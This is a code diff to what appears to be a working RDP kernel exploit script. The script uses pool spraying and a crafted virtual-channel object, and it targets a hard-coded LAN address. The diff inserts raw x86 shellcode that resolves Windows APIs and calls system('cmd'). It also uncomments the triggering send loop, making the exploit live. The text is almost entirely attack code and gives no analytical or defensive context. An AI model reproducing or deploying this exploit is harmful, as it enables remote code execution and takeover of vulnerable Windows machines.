@@ -24,7 +24,7 @@ def pool_spray(s, crypter, payload):
             quit()
 
 def main():
-    print("次数：8")
+    print("次数：9")
 
     # change to your target
     host = '192.168.1.106'
@@ -133,7 +133,36 @@ def main():
     shellcode += b"\x51\x51\x51\xe8\x00\x00\x00\x00\x83\x04\x24\x09"
     shellcode += b"\x51\x51\x52\xff\xe0\x31\xc0"
 
-    shellcode += buf
+
+    #####################################################
+    outCode = b""
+    outCode += b"\xEB\x60\x55\x8B\xEC\x64\xA1\x30"
+    outCode += b"\x00\x00\x00\x8B\x40\x0C\x8B\x40"
+    outCode += b"\x14\x8B\x00\x8B\x70\x28\x80\x7E"
+    outCode += b"\x0C\x33\x75\xF5\x8B\x40\x10\x8B"
+    outCode += b"\xF8\x03\x7F\x3C\x8B\x7F\x78\x03"
+    outCode += b"\xF8\x8B\xDF\x8B\x7B\x20\x03\xF8"
+    outCode += b"\x33\xC9\x39\x4C\x24\x08\xB9\x47"
+    outCode += b"\x02\x00\x00\x74\x05\xB9\x3E\x03"
+    outCode += b"\x00\x00\x8B\x7B\x24\x03\xF8\x8B"
+    outCode += b"\x0C\x4F\x81\xE1\xFF\xFF\x00\x00"
+    outCode += b"\x8B\x7B\x1C\x03\xF8\x49\xC1\xE1"
+    outCode += b"\x02\x8B\x3C\x0F\x03\xC7\x5D\xC2"
+    outCode += b"\x08\x00\x68\x72\x6F\x63\x41\x6A"
+    outCode += b"\x00\xE8\x94\xFF\xFF\xFF\x50\x68"
+    outCode += b"\x4C\x69\x62\x72\x68\x4C\x6F\x61"
+    outCode += b"\x64\xE8\x84\xFF\xFF\xFF\x50\x68"
+    outCode += b"\x72\x74\x00\x00\x68\x6D\x73\x76"
+    outCode += b"\x63\x54\xFF\xD0\x83\xC4\x08\x68"
+    outCode += b"\x65\x6D\x00\x00\x68\x73\x79\x73"
+    outCode += b"\x74\x54\x50\xFF\x54\x24\x14\x83"
+    outCode += b"\xC4\x08\x68\x63\x6D\x64\x00\x54"
+    outCode += b"\xFF\xD0"
+
+    ########################################################
+
+    # shellcode += buf
+    shellcode = outCode + buf
 
     print('shellcode len: %d' % len(shellcode))
 
@@ -147,7 +176,8 @@ def main():
 
     ######################################################
 
-    """
+
+
 
     fake_obj_size = 168
     call_offset = 108
@@ -168,12 +198,12 @@ def main():
         try: 
 
             s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
+            # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, ))
 
         except ConnectionResetError:
 
             s.close()
 
-    """
     s.close()
 
 
